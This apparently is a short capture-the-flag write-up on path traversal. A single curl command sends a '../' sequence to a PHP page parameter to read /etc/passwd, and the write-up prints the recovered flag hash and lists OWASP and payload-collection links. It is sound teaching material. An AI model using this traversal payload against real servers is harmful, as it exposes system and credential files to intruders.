# Path traversal

To exploit this vulnerability try to access `passwd` file going upper to the root directory.

```bash
curl -s "http://$IPADDR/index.php?page=../../../../../../../etc/passwd" | grep flag 

...
 The flag is : b12c4b2cb8094750ae121a676269aa9e2872d07c06e429d25a63196ec1c8c1d0
...
```

## References
- [Path Traversal — OWASP](https://owasp.org/www-community/attacks/Path_Traversal)
- [Directory Traversal — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [File Inclusion — PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)